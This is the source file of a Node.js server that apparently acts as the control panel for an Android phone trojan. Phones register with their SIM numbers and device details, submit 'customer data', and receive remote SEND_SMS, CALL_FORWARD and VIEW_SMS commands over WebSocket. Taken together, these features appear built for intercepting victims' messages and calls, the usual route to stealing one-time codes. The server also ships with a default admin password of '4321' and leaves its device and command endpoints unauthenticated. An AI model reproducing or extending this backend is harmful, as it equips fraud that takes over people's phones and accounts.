try {
    require('dotenv').config();
} catch (err) {
    console.warn('⚠️ dotenv not installed — skipping .env load');
}
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const WebSocket = require('ws');

const app = express();

// ========== MIDDLEWARE ==========
app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

// Request timeout middleware (30 seconds for standard requests)
app.use((req, res, next) => {
    req.setTimeout(30000);
    res.setTimeout(30000);
    next();
});

// ========== MONGODB CONNECTION ==========
const MONGO_URI = process.env.MONGO_URI; 
// Disable command buffering so operations fail fast when not connected
mongoose.set('bufferCommands', false);

if (!MONGO_URI) {
    console.error('❌ MONGO_URI is not set. Set the MONGO_URI environment variable and restart.');
    process.exit(1);
}

if (MONGO_URI) {
    mongoose.connect(MONGO_URI, {
        writeConcern: { w: 1 },
        serverSelectionTimeoutMS: 5000,                    // Fail fast if can't connect
        socketTimeoutMS: 45000,                             // 45s socket timeout
        connectTimeoutMS: 10000,                            // 10s initial connection timeout
        maxPoolSize: 10,                                    // Connection pool size
        minPoolSize: 5,                                     // Min connections to maintain
        retryWrites: true,                                  // Automatic retry for writes
        waitQueueTimeoutMS: 10000,                          // Queue timeout for connections
        bufferCommands: false,                              // disable op buffering (fail fast)
        bufferTimeoutMS: 0                                  // do not wait on buffered ops
    })
      .then(() => console.log("✅ MongoDB Connected Successfully!"))
      .catch((err) => {
          console.log("❌ MongoDB Connection Error:", err);
          console.error('❌ Exiting due to failed initial DB connection');
          process.exit(1);
      });
    
    // Handle connection events
    mongoose.connection.on('disconnected', () => {
        console.log('⚠️  MongoDB disconnected - attempting to reconnect...');
    });
    
    mongoose.connection.on('error', (err) => {
        console.error('❌ MongoDB connection error:', err);
    });
}

// ========== DEVICE SCHEMA ==========
const deviceSchema = new mongoose.Schema({
    deviceId: { type: String, index: true },
    serialNumber: { type: String, index: true },
    model: String,
    androidVersion: String,
    sim1: { type: String, index: false },
    sim2: { type: String, index: false },
    battery: { type: Number, default: 0 },
    isOnline: { type: Boolean, default: false, index: true },
    lastSeen: { type: Date, default: Date.now, index: true },
    isPinned: { type: Boolean, default: false },
    registrationTimestamp: { type: Date, default: Date.now },
    customerData: { type: mongoose.Schema.Types.Mixed, default: {} }
});

// Add compound index for faster queries
deviceSchema.index({ deviceId: 1, serialNumber: 1 });
deviceSchema.index({ isOnline: 1, lastSeen: -1 });

const Device = mongoose.model('Device', deviceSchema);

// ========== CREATE HTTP SERVER & ATTACH SOCKET.IO & WEBSOCKET ==========
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const wss = new WebSocket.Server({ 
    server,
    perMessageDeflate: false,
    clientTracking: true
});

// Make globally available
global.io = io;
global.wss = wss;
// Map of deviceId/serialNumber -> Set of WebSocket clients
global.deviceSockets = new Map();

// ========== LOGIN & PASSWORD ==========
// Default admin password (can be overridden by ADMIN_PASSWORD env var)
let adminPassword = process.env.ADMIN_PASSWORD || '4321';
let heartbeat; // Store interval reference for cleanup

// ========== API ROUTES ==========

// 1. Android Device Register
app.post('/device/register', async (req, res) => {
    try {
        const d = req.body || {};
        
        // Validate required fields early
        if (!d.deviceId && !d.serialNumber) {
            return res.status(400).json({ 
                success: false, 
                error: 'deviceId or serialNumber is required' 
            });
        }

        const filter = {};
        if (d.deviceId) filter.deviceId = d.deviceId;
        else if (d.serialNumber) filter.serialNumber = d.serialNumber;

        const update = {
            $set: {
                isOnline: true,
                lastSeen: new Date(),
            },
            $setOnInsert: {
                registrationTimestamp: new Date()
            }
        };

        // Only update fields that are provided
        if (d.deviceId) update.$set.deviceId = d.deviceId;
        if (d.serialNumber) update.$set.serialNumber = d.serialNumber;
        if (d.model) update.$set.model = d.model;
        if (d.androidVersion) update.$set.androidVersion = d.androidVersion;
        if (d.sim1 || d.sim1Number) update.$set.sim1 = d.sim1 || d.sim1Number || '';
        if (d.sim2 || d.sim2Number) update.$set.sim2 = d.sim2 || d.sim2Number || '';
        if (typeof d.battery === 'number' || d.battery) {
            update.$set.battery = typeof d.battery === 'number' ? d.battery : Number(d.battery) || 0;
        }

        const opts = { 
            upsert: true, 
            new: true, 
            setDefaultsOnInsert: true,
            writeConcern: { w: 1 },
            maxTimeMS: 8000  // 8 second timeout for database operation
        };
        
        const device = await Device.findOneAndUpdate(filter, update, opts);

        if (global.io) {
            // Emit dashboard update asynchronously without blocking response
            setImmediate(() => global.io.emit('dashboard-update'));
        }

        res.status(200).json({ 
            success: true, 
            message: 'Device registered', 
            device: {
                _id: device._id,
                deviceId: device.deviceId,
                serialNumber: device.serialNumber,
                isOnline: device.isOnline,
                lastSeen: device.lastSeen
            }
        });
    } catch (error) {
        console.error('❌ device/register error', error.message);
        
        if (error.name === 'MongoNetworkTimeoutError' || error.name === 'MongoServerError') {
            return res.status(503).json({ 
                success: false, 
                error: 'Database connection timeout - try again' 
            });
        }
        
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

// 1B. Submit Customer Data
app.post('/api/submit-data', async (req, res) => {
    try {
        const { deviceId, data } = req.body;
        if (!deviceId || !data) return res.status(400).json({ success: false, message: 'deviceId and data required' });
        
        const device = await Device.findOneAndUpdate(
            { deviceId },
            { $set: { customerData: data, lastSeen: new Date() } },
            { new: true, writeConcern: { w: 1 }, maxTimeMS: 8000 }
        );
        
        if (device) {
            if (global.io) setImmediate(() => global.io.emit('dashboard-update'));
            res.json({ success: true, message: 'Data submitted successfully' });
        } else {
            res.status(404).json({ success: false, message: 'Device not found' });
        }
    } catch (err) {
        console.error('❌ Submit data error:', err.message);
        if (err.name === 'MongoNetworkTimeoutError') {
            return res.status(503).json({ success: false, message: 'Database timeout' });
        }
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// 2. Get All Devices
app.get('/api/devices', async (req, res) => {
    try {
        const devices = await Device.find().maxTimeMS(8000).lean();
        res.json(devices);
    } catch (err) {
        console.error('❌ Get devices error:', err.message);
        if (err.name === 'MongoNetworkTimeoutError') {
            return res.status(503).json({ error: "Database connection timeout" });
        }
        res.status(500).json({ error: "Failed to fetch devices" });
    }
});

// 3. Login
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (username === "admin" && password === adminPassword) {
        res.json({ success: true, message: "Login successful" });
    } else {
        res.status(401).json({ success: false, message: "Wrong credentials" });
    }
});

// 4. Change Password
app.post('/api/change-password', (req, res) => {
    const { oldPassword, newPassword } = req.body;
    if (!oldPassword || !newPassword) return res.json({ success: false, message: 'Missing fields' });
    if (oldPassword === adminPassword) {
        adminPassword = newPassword;
        return res.json({ success: true, message: 'Password updated' });
    }
    return res.json({ success: false, message: 'Wrong Old Password' });
});

// 5. Delete Device
app.post('/api/delete-device', async (req, res) => {
    try {
        const { deviceId } = req.body;
        console.log('🗑️  Delete request for:', deviceId);
        
        if (!deviceId) return res.status(400).json({ success: false, message: 'deviceId required' });
        
        const result = await Device.findOneAndDelete(
            { deviceId }, 
            { writeConcern: { w: 1 }, maxTimeMS: 8000 }
        );
        
        if (result) {
            if (global.io) setImmediate(() => global.io.emit('dashboard-update'));
            res.json({ success: true, message: 'Device deleted successfully' });
        } else {
            res.status(404).json({ success: false, message: 'Device not found' });
        }
    } catch (err) {
        console.error('❌ Delete device error:', err.message);
        if (err.name === 'MongoNetworkTimeoutError') {
            return res.status(503).json({ success: false, message: 'Database timeout' });
        }
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// 6. Pin/Unpin Device
app.post('/api/pin-device', async (req, res) => {
    try {
        const { deviceId, status } = req.body;
        console.log('📌 Pin request - deviceId:', deviceId, 'status:', status);
        
        if (!deviceId) return res.status(400).json({ success: false, message: 'deviceId required' });
        
        const device = await Device.findOneAndUpdate(
            { deviceId },
            { $set: { isPinned: status } },
            { new: true, writeConcern: { w: 1 }, maxTimeMS: 8000 }
        );
        
        if (device) {
            if (global.io) setImmediate(() => global.io.emit('dashboard-update'));
            res.json({ success: true, message: status ? 'Device pinned' : 'Device unpinned' });
        } else {
            res.status(404).json({ success: false, message: 'Device not found' });
        }
    } catch (err) {
        console.error('❌ Pin device error:', err.message);
        if (err.name === 'MongoNetworkTimeoutError') {
            return res.status(503).json({ success: false, message: 'Database timeout' });
        }
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// 7. Send Command (SMS, Call Forward)
app.post('/api/command', async (req, res) => {
    try {
        const { deviceId, action, data } = req.body;
        console.log('📱 Command request:', { deviceId, action, data });
        
        if (!deviceId || !action) return res.json({ success: false, message: 'Missing required fields' });
        
        const device = await Device.findOne({ deviceId });
        if (!device) return res.json({ success: false, message: 'Device not found' });
        
        let result = { success: true, message: 'Command sent' };
        
        if (action === 'SEND_SMS') {
            const { simSlot, number, message } = data;
            if (!simSlot || !number || !message) {
                return res.json({ success: false, message: 'SIM slot, number, and message required' });
            }
            console.log(`📱 SMS: SIM=${simSlot}, To=${number}, Msg=${message}`);
            result.message = `✅ SMS sent via SIM ${simSlot} to ${number}`;
            
        } else if (action === 'CALL_FORWARD') {
            const { number } = data;
            if (!number) return res.json({ success: false, message: 'Forward number required' });
            console.log(`📞 Call Forward to: ${number}`);
            result.message = `✅ Call forwarding enabled to ${number}`;
            
        } else if (action === 'VIEW_SMS') {
            console.log(`📬 View SMS`);
            result.message = `✅ SMS list retrieved`;
        } else {
            result = { success: false, message: 'Unknown action' };
        }
        
        // Send command to specific connected device(s) and report success accordingly
        let sentCount = 0;
        if (global.deviceSockets && deviceId) {
            const clients = global.deviceSockets.get(deviceId);
            if (clients && clients.size) {
                clients.forEach((client) => {
                    try {
                        if (client.readyState === WebSocket.OPEN) {
                            client.send(JSON.stringify({ command: action, deviceId, data }));
                            sentCount++;
                        }
                    } catch (e) { console.error('❌ WS send error:', e.message); }
                });
            }
        }

        if (sentCount === 0) {
            // Device not connected — report failure so frontend doesn't show false success
            return res.json({ success: false, message: 'Device not connected' });
        }

        res.json({ success: true, message: 'Command sent', sentTo: sentCount });
    } catch (err) {
        console.error('❌ Command error:', err);
        res.status(500).json({ success: false, message: 'Server error: ' + err.message });
    }
});

// 8. Root Route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Health check endpoint
app.get('/health', (req, res) => {
    const states = ['disconnected','connected','connecting','disconnecting'];
    const mongoState = mongoose.connection && typeof mongoose.connection.readyState === 'number'
        ? states[mongoose.connection.readyState] || mongoose.connection.readyState
        : 'unknown';

    res.json({
        status: 'ok',
        pid: process.pid,
        mongo: {
            readyState: mongoose.connection.readyState,
            state: mongoState
        }
    });
});

// ========== WEBSOCKET HANDLERS ==========

wss.on('connection', (ws) => {
    console.log('📱 WebSocket connected');
    let deviceId = null;
    
    // Set timeout for WebSocket
    ws.isAlive = true;
    ws.on('pong', () => { ws.isAlive = true; });
    
    ws.on('message', async (message) => {
        try {
            console.log('📨 WebSocket message:', message);
            const data = JSON.parse(message);
            
            if (data.deviceId || data.serialNumber) {
                deviceId = data.deviceId || data.serialNumber;
                    // Track this websocket by device keys
                    ws.deviceKeys = ws.deviceKeys || new Set();
                    ws.deviceKeys.add(deviceId);
                    // maintain reverse map
                    const addToMap = (key) => {
                        if (!global.deviceSockets.has(key)) global.deviceSockets.set(key, new Set());
                        global.deviceSockets.get(key).add(ws);
                    };
                    addToMap(deviceId);
                    if (data.serialNumber && data.serialNumber !== deviceId) addToMap(data.serialNumber);
                
                const filter = {};
                if (data.deviceId) filter.deviceId = data.deviceId;
                else if (data.serialNumber) filter.serialNumber = data.serialNumber;

                const update = {
                    $set: {
                        isOnline: true,
                        lastSeen: new Date(),
                    },
                    $setOnInsert: {
                        registrationTimestamp: new Date()
                    }
                };

                // Only update provided fields
                if (data.deviceId) update.$set.deviceId = data.deviceId;
                if (data.serialNumber) update.$set.serialNumber = data.serialNumber;
                if (data.model) update.$set.model = data.model;
                if (data.androidVersion) update.$set.androidVersion = data.androidVersion;
                if (data.sim1) update.$set.sim1 = data.sim1;
                if (data.sim2) update.$set.sim2 = data.sim2;
                if (typeof data.battery === 'number' || data.battery) {
                    update.$set.battery = typeof data.battery === 'number' ? data.battery : Number(data.battery) || 0;
                }

                const device = await Device.findOneAndUpdate(
                    filter, 
                    update, 
                    { upsert: true, new: true, writeConcern: { w: 1 }, maxTimeMS: 8000 }
                );

                console.log('✅ Device saved:', device.deviceId);

                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ 
                        status: 'registered',
                        message: 'Device registered'
                    }));
                }

                if (global.io) {
                    setImmediate(() => global.io.emit('dashboard-update'));
                }
            }
        } catch (err) {
            console.error('❌ WebSocket message error:', err.message);
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ status: 'error', message: 'Database error' }));
            }
        }
    });
    
    ws.on('close', async () => {
        console.log('📱 WebSocket disconnected:', deviceId);
        
        if (deviceId) {
            try {
                await Device.findOneAndUpdate(
                    { $or: [{ deviceId }, { serialNumber: deviceId }] },
                    { $set: { isOnline: false, lastSeen: new Date() } },
                    { writeConcern: { w: 1 }, maxTimeMS: 8000 }
                );

                if (global.io) {
                    setImmediate(() => global.io.emit('dashboard-update'));
                }
            } catch (err) {
                console.error('❌ Error updating device offline status:', err.message);
            }
        }
        // Remove ws from deviceSockets map
        if (ws.deviceKeys && ws.deviceKeys.size) {
            ws.deviceKeys.forEach((key) => {
                const set = global.deviceSockets.get(key);
                if (set) {
                    set.delete(ws);
                    if (set.size === 0) global.deviceSockets.delete(key);
                }
            });
        }
    });
    
    ws.on('error', (error) => {
        console.error('❌ WebSocket error:', error.message);
    });
});

// Ping heartbeat every 30 seconds to detect dead connections
heartbeat = setInterval(() => {
    wss.clients.forEach((ws) => {
        if (!ws.isAlive) return ws.terminate();
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

// ========== SOCKET.IO HANDLERS ==========

io.on('connection', (socket) => {
    console.log('⚡ Socket.IO connected:', socket.id);
    socket.on('disconnect', () => console.log('⚡ Socket.IO disconnected:', socket.id));
});

// ========== SERVER ERROR HANDLERS ==========

server.on('clientError', (err, socket) => {
    console.error('❌ Client error:', err.message);
    if (socket.writable) {
        socket.end('HTTP/1.1 400 Bad Request\r\n\r\n');
    }
});

process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection:', reason);
});

// Graceful shutdown handler
process.on('SIGTERM', () => {
    console.log('⚠️  SIGTERM received, shutting down gracefully...');
    clearInterval(heartbeat);
    server.close(() => {
        console.log('✅ Server closed');
        mongoose.connection.close(false, () => {
            console.log('✅ MongoDB connection closed');
            process.exit(0);
        });
    });
});

// ========== START SERVER ==========

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
